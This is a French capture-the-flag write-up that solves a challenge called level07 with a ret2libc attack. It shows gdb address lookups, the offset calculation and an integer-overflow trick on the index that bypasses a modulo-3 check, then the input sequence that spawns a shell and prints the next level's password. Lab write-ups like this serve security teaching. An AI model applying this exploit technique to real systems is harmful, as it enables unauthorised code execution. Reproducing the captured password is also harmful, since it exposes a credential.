On voit qu'au debut du programme, toutes les args, de main sont mis a 0.
On ne va donc utiliser un ret2libc.

pour ca il nous faut l'adresse de main, l'adresse de /bin/sh et l'offset.

(gdb) info proc map
process 1832
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/users/level07/level07
	 0x8049000  0x804a000     0x1000     0x1000 /home/users/level07/level07
	 0x804a000  0x804b000     0x1000     0x2000 /home/users/level07/level07
	0xf7e2b000 0xf7e2c000     0x1000        0x0 
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
	0xf7fd0000 0xf7fd4000     0x4000        0x0 
	0xf7fda000 0xf7fdb000     0x1000        0x0 
	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
(gdb) find 0xf7e2c000,0xf7fcf000, "/bin/sh"
0xf7f897ec

maintenant nous avons l'adresse de /bin/sh, l'adresse de system : 

(gdb) info func system
All functions matching regular expression "system":

Non-debugging symbols:
0xf7e6aed0  __libc_system
0xf7e6aed0  system
0xf7f48a50  svcerr_systemerr

nous avons l'adresse de system, maintenant il faut trouver l'offset

pour trouver l'offset, on va:


compter les 4 registres qui sont push : 16
   0x08048723 <+0>:	push   ebp
   0x08048724 <+1>:	mov    ebp,esp
   0x08048726 <+3>:	push   edi
   0x08048727 <+4>:	push   esi
   0x08048728 <+5>:	push   ebx


trouver la taille de la stack :0x1d0 = 464
   0x0804872c <+9>:	sub    esp,0x1d0

prendre en compte cette ligne qui aligne les adresses de la stack avec 16 , ce qui a pour effet de retirer 12 dans le cas present
   0x08048729 <+6>:	and    esp,0xfffffff0

puis on soustrait le debut du buffer par rapport au haut de la stack :

    int8_t  buffer[0x64] = {0};      // ESP + 0x24 = 36  

ce qui nous donne :
(16+464+12 - 36) / 4 == 114

or on ne peut pas utiliser 114, car il est divisible par 3 et 
 if (!(index % 3) || number >> 0x18 != 0xb7)

On va donc faire overflow l'int32:

114 + 1 + 0xffffffff / 4 = 1073741938

1073741938 % 3 = 1

ensuite on va pouvoir manipuler les zones memoire du programme comme on veut:

Input command: store
 Number: 4160264172 // adresse 0xf7f897ec de /bin/sh en decimal
 Index: 116 //on write a 116 pour que l'appel qu'on va ecrire sur 114 notre valeur en parametre 
Input command: sotre
 Failed to do sotre command
Input command: store
 Number: 4159090384 // adresse de system en decimal
 Index: 1073741938 //on fait onverflow l'index pour write sur 114
 Completed store command successfully
Input command: quit
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC





